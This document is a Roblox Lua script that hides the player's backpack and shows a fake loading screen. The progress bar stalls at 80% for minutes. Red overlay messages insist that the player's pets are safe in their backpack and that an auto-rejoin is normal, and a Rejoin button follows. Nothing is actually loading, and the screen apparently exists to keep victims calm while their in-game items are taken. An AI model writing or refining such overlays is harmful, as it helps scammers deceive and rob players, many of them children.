-- ✅ Hide default Backpack UI
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)

local player = game.Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

-- ✅ ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingUI"
gui.IgnoreGuiInset = true
gui.DisplayOrder = 9999
gui.Parent = PlayerGui

-- ✅ Slim black bar
local barFrame = Instance.new("Frame")
barFrame.Parent = gui
barFrame.AnchorPoint = Vector2.new(0.5, 1)
barFrame.Position = UDim2.new(0.5, 0, 1, 0)
barFrame.Size = UDim2.new(1, 0, 0.08, 0)
barFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
barFrame.ZIndex = 1000

-- ✅ Progress fill
local progressFill = Instance.new("Frame")
progressFill.Parent = barFrame
progressFill.AnchorPoint = Vector2.new(0, 0.5)
progressFill.Position = UDim2.new(0, 0, 0.5, 0)
progressFill.Size = UDim2.new(0, 0, 0.6, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(25, 200, 75)
progressFill.ZIndex = 1001

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 4)
fillCorner.Parent = progressFill

-- ✅ Loading text INSIDE the progress fill
local loadingText = Instance.new("TextLabel")
loadingText.Parent = progressFill
loadingText.Size = UDim2.new(1, 0, 1, 0)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 18
loadingText.Text = "Loading... 0%"
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.TextStrokeTransparency = 0.5
loadingText.ZIndex = 1002

-- ✅ Pets warning
local warningText = Instance.new("TextLabel")
warningText.Parent = gui
warningText.AnchorPoint = Vector2.new(0.5, 1)
warningText.Position = UDim2.new(0.5, 0, 1 - 0.08, -50)
warningText.Size = UDim2.new(0, 600, 0, 40)
warningText.BackgroundTransparency = 1
warningText.Font = Enum.Font.GothamBold
warningText.TextSize = 20
warningText.TextWrapped = true
warningText.TextYAlignment = Enum.TextYAlignment.Center
warningText.Text = "⚠️ DON'T PANIC! ALL YOUR PETS ARE IN YOUR BACKPACK ⚠️"
warningText.TextColor3 = Color3.fromRGB(255, 75, 75)
warningText.TextStrokeTransparency = 0.5
warningText.ZIndex = 1002

-- ✅ NEW: Auto Rejoin warning
local autoRejoinText = Instance.new("TextLabel")
autoRejoinText.Parent = gui
autoRejoinText.AnchorPoint = Vector2.new(0.5, 1)
autoRejoinText.Position = UDim2.new(0.5, 0, 1 - 0.08, -80)
autoRejoinText.Size = UDim2.new(0, 600, 0, 30)
autoRejoinText.BackgroundTransparency = 1
autoRejoinText.Font = Enum.Font.GothamBold
autoRejoinText.TextSize = 20
autoRejoinText.TextWrapped = true
autoRejoinText.TextYAlignment = Enum.TextYAlignment.Center
autoRejoinText.Text = "⚠️ IF YOU GOT AUTO REJOIN JUST WAIT ITS NORMAL ⚠️"
autoRejoinText.TextColor3 = Color3.fromRGB(255, 75, 75)
autoRejoinText.TextStrokeTransparency = 0.5
autoRejoinText.ZIndex = 1002

-- ✅ Rejoin button (hidden initially)
local rejoinButton = Instance.new("TextButton")
rejoinButton.Parent = gui
rejoinButton.AnchorPoint = Vector2.new(0.5, 1)
rejoinButton.Position = UDim2.new(0.5, 0, 1 - 0.08, -120)
rejoinButton.Size = UDim2.new(0, 200, 0, 40)
rejoinButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
rejoinButton.Font = Enum.Font.GothamBold
rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
rejoinButton.TextScaled = true
rejoinButton.Text = "🔄 Rejoin"
rejoinButton.ZIndex = 1002
rejoinButton.Visible = false

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = rejoinButton

rejoinButton.MouseButton1Click:Connect(function()
    TeleportService:Teleport(game.PlaceId, player)
end)

-- ✅ Progress: Fill to 80% in 60s, stuck 3 min, then fill to 85% with button
local startTime = tick()
local firstDuration = 60 -- 1 min
local stuckTime = 180 -- 3 mins
local finalDuration = 15 -- 15 sec
local targetPercent = 80
local finalTarget = 85

local connection
connection = RunService.RenderStepped:Connect(function()
    local elapsed = tick() - startTime
    if elapsed <= firstDuration then
        local progress = math.clamp(elapsed / firstDuration, 0, 1)
        local percent = math.floor(progress * targetPercent)
        progressFill.Size = UDim2.new(progress * 0.8, 0, 0.6, 0)
        loadingText.Text = "Loading... " .. tostring(percent) .. "%"
    elseif elapsed <= firstDuration + stuckTime then
        progressFill.Size = UDim2.new(0.8, 0, 0.6, 0)
        loadingText.Text = "Loading... 80%"
    else
        local finalElapsed = elapsed - (firstDuration + stuckTime)
        local progress = math.clamp(finalElapsed / finalDuration, 0, 1)
        local percent = 80 + math.floor(progress * (finalTarget - targetPercent))
        progressFill.Size = UDim2.new(0.8 + (progress * 0.05), 0, 0.6, 0)
        loadingText.Text = "Loading... " .. tostring(percent) .. "%"
        if progress >= 1 then
            loadingText.Text = "Loading... 85%"
            rejoinButton.Visible = true
            connection:Disconnect()
        end
    end
end)
